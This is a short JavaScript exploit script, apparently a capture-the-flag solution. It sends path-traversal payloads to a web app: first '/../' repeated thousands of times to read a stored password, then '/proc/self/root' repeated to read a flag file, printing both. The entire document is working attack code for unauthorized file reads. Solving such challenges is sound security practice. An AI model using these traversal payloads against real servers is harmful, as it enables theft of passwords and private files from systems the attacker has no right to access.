const exploit = async (url) => {
	const form = new FormData();
	form.append('page', './' + '/../'.repeat(5000) + '/app/password');
	
	const password = await fetch(url, {
		method: 'POST',
		body: form
	}).then(r => r.text());
	console.log(`password: ${password}`);

	const form2 = new FormData();
	form2.append('password', password);
	form2.append('page', '/proc/self/root'.repeat(100) + '/app/flag');
	
	const content = await fetch(new URL('/premium', url), {
		method: 'POST',
		body: form2
	}).then(r => r.text());
	console.log(content);  // flag
}

const APP_URL = process.env.WEB_BASE_URL ?? fail('No WEB_BASE_URL');

(async () => {
	await exploit(APP_URL);
})();
